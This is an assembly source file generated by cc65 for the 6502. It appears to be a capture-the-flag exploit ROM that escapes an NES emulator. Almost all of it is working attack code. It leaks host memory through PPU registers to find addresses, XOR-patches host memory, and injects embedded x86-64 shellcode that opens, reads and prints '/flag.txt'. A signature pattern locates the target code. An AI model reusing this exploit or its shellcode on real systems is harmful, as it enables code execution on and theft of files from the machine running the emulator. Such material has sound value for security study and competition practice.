;
; File generated by cc65 v 2.18 - Git ece63f0
;
	.fopt		compiler,"cc65 v 2.18 - Git ece63f0"
	.setcpu		"6502"
	.smart		on
	.autoimport	on
	.case		on
	.debuginfo	off
	.importzp	sp, sreg, regsave, regbank
	.importzp	tmp1, tmp2, tmp3, tmp4, ptr1, ptr2, ptr3, ptr4
	.macpack	longbranch
	.forceimport	__STARTUP__
	.import		_bka
	.import		_bkx
	.export		_shellcode
	.export		_pattern
	.export		_reset
	.export		_sub64
	.export		_xorAt64
	.export		_xorAt
	.export		_putchar
	.export		_get_data
	.export		_leak
	.export		_log64
	.export		_dump
	.export		_debug
	.export		_main

.segment	"DATA"

_shellcode:
	.byte	$90
	.byte	$48
	.byte	$31
	.byte	$D2
	.byte	$48
	.byte	$31
	.byte	$C0
	.byte	$48
	.byte	$31
	.byte	$F6
	.byte	$48
	.byte	$BB
	.byte	$6C
	.byte	$6F
	.byte	$6C
	.byte	$6C
	.byte	$6F
	.byte	$6C
	.byte	$6C
	.byte	$74
	.byte	$48
	.byte	$C1
	.byte	$EB
	.byte	$38
	.byte	$53
	.byte	$48
	.byte	$BB
	.byte	$2F
	.byte	$66
	.byte	$6C
	.byte	$61
	.byte	$67
	.byte	$2E
	.byte	$74
	.byte	$78
	.byte	$53
	.byte	$48
	.byte	$89
	.byte	$E7
	.byte	$B0
	.byte	$02
	.byte	$0F
	.byte	$05
	.byte	$48
	.byte	$89
	.byte	$C7
	.byte	$48
	.byte	$31
	.byte	$C0
	.byte	$48
	.byte	$89
	.byte	$E6
	.byte	$BA
	.byte	$00
	.byte	$01
	.byte	$00
	.byte	$00
	.byte	$0F
	.byte	$05
	.byte	$48
	.byte	$89
	.byte	$C2
	.byte	$B8
	.byte	$01
	.byte	$00
	.byte	$00
	.byte	$00
	.byte	$BF
	.byte	$01
	.byte	$00
	.byte	$00
	.byte	$00
	.byte	$0F
	.byte	$05
	.byte	$00
	.byte	$00
	.byte	$00
	.byte	$00
	.byte	$00
	.byte	$00
_pattern:
	.byte	$64
	.byte	$4C
	.byte	$8B
	.byte	$1C
	.byte	$25
	.byte	$28
	.byte	$FF
	.byte	$FF
	.byte	$FF
	.byte	$41
	.byte	$FF
	.byte	$A3
	.byte	$18
	.byte	$3C
	.byte	$00
	.byte	$00

; ---------------------------------------------------------------
; void __near__ reset (void)
; ---------------------------------------------------------------

.segment	"CODE"

.proc	_reset: near

.segment	"CODE"

	lda     #$00
	jsr     _bka
	lda     #$00
	jsr     _bka
	lda     #$00
	jsr     _bka
	lda     #$00
	jmp     _bka

.endproc

; ---------------------------------------------------------------
; void __near__ sub64 (unsigned long, unsigned long, unsigned long, unsigned long, __near__ unsigned long *, __near__ unsigned long *)
; ---------------------------------------------------------------

.segment	"CODE"

.proc	_sub64: near

.segment	"CODE"

	jsr     pushax
	ldy     #$05
	jsr     pushwysp
	ldy     #$15
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$11
	jsr     ldeaxysp
	jsr     tossubeax
	ldy     #$00
	jsr     steaxspidx
	ldy     #$13
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$0F
	jsr     ldeaxysp
	jsr     tosulteax
	beq     L0072
	jsr     pushw0sp
	ldy     #$11
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$0D
	jsr     ldeaxysp
	jsr     tossubeax
	ldy     #$01
	jsr     deceaxy
	jmp     L01A5
L0072:	jsr     pushw0sp
	ldy     #$11
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$0D
	jsr     ldeaxysp
	jsr     tossubeax
L01A5:	ldy     #$00
	jsr     steaxspidx
	ldy     #$14
	jmp     addysp

.endproc

; ---------------------------------------------------------------
; void __near__ xorAt64 (unsigned long, unsigned long, unsigned char)
; ---------------------------------------------------------------

.segment	"CODE"

.proc	_xorAt64: near

.segment	"CODE"

	jsr     pusha
	jsr     decsp2
	ldx     #$00
	txa
L01AA:	jsr     stax0sp
	cmp     #$04
	txa
	sbc     #$00
	bvc     L0081
	eor     #$80
L0081:	asl     a
	lda     #$00
	tax
	bcc     L01A7
	ldy     #$06
	jsr     ldeaxysp
	jsr     pusheax
	lda     #$03
	sec
	ldy     #$04
	sbc     (sp),y
	pha
	lda     #$00
	iny
	sbc     (sp),y
	pla
	asl     a
	asl     a
	asl     a
	jsr     tosshreax
	jsr     _bka
	jsr     ldax0sp
	jsr     incax1
	jmp     L01AA
L01A7:	jsr     stax0sp
	cmp     #$04
	txa
	sbc     #$00
	bvc     L008F
	eor     #$80
L008F:	bpl     L0089
	ldy     #$0A
	jsr     ldeaxysp
	jsr     pusheax
	lda     #$03
	sec
	ldy     #$04
	sbc     (sp),y
	pha
	lda     #$00
	iny
	sbc     (sp),y
	pla
	asl     a
	asl     a
	asl     a
	jsr     tosshreax
	jsr     _bka
	jsr     ldax0sp
	jsr     incax1
	jmp     L01A7
L0089:	ldy     #$02
	lda     (sp),y
	jsr     _bkx
	jsr     _reset
	ldy     #$0B
	jmp     addysp

.endproc

; ---------------------------------------------------------------
; void __near__ xorAt (unsigned long, unsigned char)
; ---------------------------------------------------------------

.segment	"CODE"

.proc	_xorAt: near

.segment	"CODE"

	jsr     pusha
	jsr     decsp2
	ldx     #$00
	txa
L01AC:	jsr     stax0sp
	cmp     #$04
	txa
	sbc     #$00
	bvc     L00A1
	eor     #$80
L00A1:	bpl     L009B
	ldy     #$06
	jsr     ldeaxysp
	jsr     pusheax
	lda     #$03
	sec
	ldy     #$04
	sbc     (sp),y
	pha
	lda     #$00
	iny
	sbc     (sp),y
	pla
	asl     a
	asl     a
	asl     a
	jsr     tosshreax
	jsr     _bka
	jsr     ldax0sp
	jsr     incax1
	jmp     L01AC
L009B:	ldy     #$02
	lda     (sp),y
	jsr     _bkx
	jsr     _reset
	jmp     incsp7

.endproc

; ---------------------------------------------------------------
; void __near__ putchar (unsigned char)
; ---------------------------------------------------------------

.segment	"CODE"

.proc	_putchar: near

.segment	"CODE"

	jsr     pusha
	ldy     #$00
	lda     (sp),y
	sta     $4015
	jmp     incsp1

.endproc

; ---------------------------------------------------------------
; unsigned char __near__ get_data (unsigned int)
; ---------------------------------------------------------------

.segment	"CODE"

.proc	_get_data: near

.segment	"CODE"

	jsr     pushax
	ldy     #$01
	lda     (sp),y
	jsr     pusha
	ldy     #$01
	lda     (sp),y
	jsr     pusha
	ldy     #$01
	lda     (sp),y
	sta     $2006
	dey
	lda     (sp),y
	sta     $2006
	ldx     #$00
	lda     $2007
	jmp     incsp4

.endproc

; ---------------------------------------------------------------
; void __near__ leak (unsigned int, __near__ unsigned long *, __near__ unsigned long *)
; ---------------------------------------------------------------

.segment	"CODE"

.proc	_leak: near

.segment	"CODE"

	jsr     pushax
	lda     #$00
	jsr     pusha
	tax
	jsr     _get_data
	lda     #$00
	tay
L01B3:	sta     (sp),y
	cmp     #$04
	bcs     L01AF
	ldy     #$02
	jsr     ldaxysp
	jsr     pushax
	jsr     ldeaxi
	jsr     pusheax
	ldy     #$06
	lda     (sp),y
	clc
	ldy     #$0B
	adc     (sp),y
	pha
	lda     #$00
	iny
	adc     (sp),y
	tax
	pla
	jsr     incax1
	jsr     _get_data
	jsr     aulong
	jsr     axulong
	jsr     pusheax
	ldy     #$0A
	lda     (sp),y
	asl     a
	asl     a
	asl     a
	jsr     tosshleax
	jsr     tosoreax
	ldy     #$00
	jsr     steaxspidx
	ldy     #$00
	lda     (sp),y
	clc
	adc     #$01
	jmp     L01B3
L01AF:	tya
	sta     (sp),y
	tax
L01B1:	lda     (sp),y
	cmp     #$04
	bcs     L01B2
	ldy     #$04
	jsr     ldaxysp
	jsr     pushax
	jsr     ldeaxi
	jsr     pusheax
	ldy     #$06
	lda     (sp),y
	clc
	ldy     #$0B
	adc     (sp),y
	pha
	lda     #$00
	iny
	adc     (sp),y
	tax
	pla
	jsr     incax5
	jsr     _get_data
	jsr     aulong
	jsr     axulong
	jsr     pusheax
	ldy     #$0A
	lda     (sp),y
	asl     a
	asl     a
	asl     a
	jsr     tosshleax
	jsr     tosoreax
	ldy     #$00
	jsr     steaxspidx
	ldy     #$00
	ldx     #$00
	lda     (sp),y
	clc
	adc     #$01
	sta     (sp),y
	jmp     L01B1
L01B2:	txa
	jsr     _get_data
	jmp     incsp7

.endproc

; ---------------------------------------------------------------
; void __near__ log64 (unsigned long, unsigned long)
; ---------------------------------------------------------------

.segment	"CODE"

.proc	_log64: near

.segment	"CODE"

	jsr     pusheax
	lda     #$00
	jsr     pusha
	lda     #$46
	jsr     _putchar
	lda     #$46
	jsr     _putchar
	lda     #$00
	tay
L01B9:	sta     (sp),y
	cmp     #$04
	bcs     L01B6
	ldy     #$04
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$04
	lda     (sp),y
	asl     a
	asl     a
	asl     a
	jsr     tosshreax
	jsr     _putchar
	ldy     #$00
	lda     (sp),y
	clc
	adc     #$01
	jmp     L01B9
L01B6:	tya
L01BA:	sta     (sp),y
	cmp     #$04
	bcs     L00EB
	ldy     #$08
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$04
	lda     (sp),y
	asl     a
	asl     a
	asl     a
	jsr     tosshreax
	jsr     _putchar
	ldy     #$00
	lda     (sp),y
	clc
	adc     #$01
	jmp     L01BA
L00EB:	lda     #$41
	jsr     _putchar
	lda     #$42
	jsr     _putchar
	lda     #$43
	jsr     _putchar
	ldy     #$09
	jmp     addysp

.endproc

; ---------------------------------------------------------------
; void __near__ dump (unsigned long)
; ---------------------------------------------------------------

.segment	"CODE"

.proc	_dump: near

.segment	"CODE"

	jsr     pusheax
	jsr     decsp1
	lda     #$00
	tay
L01BD:	sta     (sp),y
	cmp     #$FF
	bcs     L00FE
	ldy     #$04
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$04
	ldx     #$00
	lda     (sp),y
	jsr     axulong
	jsr     tosaddeax
	jsr     pusheax
	lda     #$00
	jsr     _xorAt
	ldy     #$00
	lda     (sp),y
	clc
	adc     #$01
	jmp     L01BD
L00FE:	ldy     #$04
	jsr     ldeaxysp
	ldy     #$FF
	jsr     inceaxy
	jsr     pusheax
	lda     #$00
	jsr     _xorAt
	jmp     incsp5

.endproc

; ---------------------------------------------------------------
; void __near__ debug (void)
; ---------------------------------------------------------------

.segment	"CODE"

.proc	_debug: near

.segment	"CODE"

	lda     #$01
L01BF:	sta     $4016
	jmp     L01BF

.endproc

; ---------------------------------------------------------------
; int __near__ main (void)
; ---------------------------------------------------------------

.segment	"CODE"

.proc	_main: near

.segment	"CODE"

	ldy     #$22
	jsr     subysp
	ldx     #$2D
	lda     #$0A
	sta     sreg
	lda     #$00
	sta     sreg+1
	lda     #$7C
	jsr     pusheax
	jsr     pushl0
	lda     #$01
	jsr     _xorAt64
	ldx     #$00
	stx     sreg
	stx     sreg+1
	txa
	ldy     #$1A
	jsr     steaxysp
	ldy     #$1E
	jsr     steaxysp
	ldx     #$03
	lda     #$F0
	jsr     pushax
	lda     #$1C
	jsr     leaa0sp
	jsr     pushax
	lda     #$22
	jsr     leaa0sp
	jsr     _leak
	ldx     #$30
	lda     #$00
	sta     sreg
	sta     sreg+1
	ldy     #$1E
	jsr     lsubeqysp
	ldy     #$21
	jsr     ldeaxysp
	jsr     pusheax
	ldx     #$FF
	stx     sreg
	stx     sreg+1
	lda     #$00
	jsr     tosandeax
	ldy     #$1E
	jsr     steaxysp
	ldx     #$00
	stx     sreg
	stx     sreg+1
	txa
	ldy     #$12
	jsr     steaxysp
	ldy     #$16
	jsr     steaxysp
	ldx     #$03
	lda     #$D0
	jsr     pushax
	lda     #$14
	jsr     leaa0sp
	jsr     pushax
	lda     #$1A
	jsr     leaa0sp
	jsr     _leak
	ldx     #$53
	lda     #$05
	sta     sreg
	lda     #$00
	sta     sreg+1
	lda     #$E0
	ldy     #$16
	jsr     lsubeqysp
	ldy     #$1D
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$25
	jsr     ldeaxysp
	jsr     _log64
	ldy     #$15
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$1D
	jsr     ldeaxysp
	jsr     _log64
	ldy     #$21
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$21
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$21
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$21
	jsr     ldeaxysp
	jsr     pusheax
	lda     #$1E
	jsr     leaa0sp
	jsr     pushax
	lda     #$1C
	jsr     leaa0sp
	jsr     _sub64
	ldy     #$0D
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$15
	jsr     ldeaxysp
	jsr     _log64
	lda     #$00
	ldy     #$01
L01D1:	sta     (sp),y
	cmp     #$4A
	bcs     L01C3
	lda     #<(_shellcode)
	ldx     #>(_shellcode)
	clc
	adc     (sp),y
	bcc     L0145
	inx
L0145:	jsr     pushax
	sta     ptr1
	stx     ptr1+1
	ldy     #$00
	lda     (ptr1),y
	sta     sreg
	ldy     #$03
	lda     (sp),y
	and     #$0F
	sta     ptr1
	lda     #$00
	clc
	adc     #>(_pattern)
	sta     ptr1+1
	ldy     #<(_pattern)
	lda     (ptr1),y
	eor     sreg
	ldy     #$00
	jsr     staspidx
	ldy     #$01
	lda     (sp),y
	clc
	adc     #$01
	jmp     L01D1
L01C3:	lda     #$00
L01D2:	sta     (sp),y
	cmp     #$10
	bcs     L01C6
	lda     #<(_pattern)
	ldx     #>(_pattern)
	clc
	adc     (sp),y
	bcc     L0152
	inx
L0152:	sta     ptr1
	stx     ptr1+1
	dey
	lda     (ptr1),y
	eor     #$90
	sta     (ptr1),y
	iny
	lda     (sp),y
	clc
	adc     #$01
	jmp     L01D2
L01C6:	lda     #$00
	dey
L01D3:	sta     (sp),y
	cmp     #$03
	jcs     L0155
	tya
	iny
	sta     (sp),y
	tax
L01CA:	lda     (sp),y
	cmp     #$B0
	bcs     L01CB
	ldy     #$11
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$05
	ldx     #$00
	lda     (sp),y
	jsr     axulong
	jsr     tosaddeax
	jsr     pusheax
	ldy     #$11
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$09
	lda     (sp),y
	and     #$0F
	sta     ptr1
	lda     #$00
	clc
	adc     #>(_pattern)
	sta     ptr1+1
	ldy     #<(_pattern)
	lda     (ptr1),y
	jsr     _xorAt64
	ldy     #$01
	ldx     #$00
	lda     (sp),y
	clc
	adc     #$01
	sta     (sp),y
	jmp     L01CA
L01CB:	stx     sreg
	stx     sreg+1
	lda     #$B0
	ldy     #$0E
	jsr     laddeqysp
	lda     #$00
	ldy     #$01
	sta     (sp),y
	tax
L01CD:	lda     (sp),y
	cmp     #$4A
	bcs     L01CE
	ldy     #$11
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$05
	ldx     #$00
	lda     (sp),y
	jsr     axulong
	jsr     tosaddeax
	jsr     pusheax
	ldy     #$11
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$09
	lda     (sp),y
	tay
	lda     _shellcode,y
	jsr     _xorAt64
	ldy     #$01
	ldx     #$00
	lda     (sp),y
	clc
	adc     #$01
	sta     (sp),y
	jmp     L01CD
L01CE:	stx     sreg
	stx     sreg+1
	lda     #$50
	ldy     #$0E
	jsr     laddeqysp
	ldy     #$00
	lda     (sp),y
	clc
	adc     #$01
	jmp     L01D3
L0155:	ldx     #$03
	tya
	sta     sreg
	sta     sreg+1
	ldy     #$0E
	jsr     lsubeqysp
	ldy     #$21
	jsr     ldeaxysp
	ldy     #$02
	jsr     steaxysp
	ldy     #$21
	jsr     ldeaxysp
	jsr     pusheax
	ldx     #$2D
	lda     #$06
	sta     sreg
	lda     #$00
	sta     sreg+1
	lda     #$79
	jsr     tossubeax
	ldy     #$06
	jsr     steaxysp
	ldy     #$05
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$0D
	jsr     ldeaxysp
	jsr     tosxoreax
	ldy     #$02
	jsr     steaxysp
	ldy     #$05
	jsr     ldeaxysp
	jsr     pusheax
	ldx     #$08
	lda     #$00
	jsr     tosor0ax
	ldy     #$02
	jsr     steaxysp
	lda     #$00
	ldy     #$01
L01D4:	sta     (sp),y
	cmp     #$04
	bcs     L0186
	ldx     #$00
	lda     (sp),y
	jsr     axulong
	jsr     pusheax
	ldx     #$B1
	lda     #$3F
	sta     sreg
	lda     #$00
	sta     sreg+1
	lda     #$08
	jsr     tosaddeax
	jsr     pusheax
	jsr     pushl0
	ldy     #$0D
	jsr     ldeaxysp
	jsr     pusheax
	ldy     #$0D
	lda     (sp),y
	asl     a
	asl     a
	asl     a
	jsr     tosshreax
	jsr     _xorAt64
	ldy     #$01
	lda     (sp),y
	clc
	adc     #$01
	jmp     L01D4
L0186:	lda     #$47
	jsr     _putchar
	lda     #$47
	jsr     _putchar
	lda     #$47
	jsr     _putchar
	lda     #$47
	jsr     _putchar
	lda     #$47
	jsr     _putchar
	ldy     #$01
	lda     (sp),y
	sta     $4016
L01C0:	jmp     L01C0

.endproc

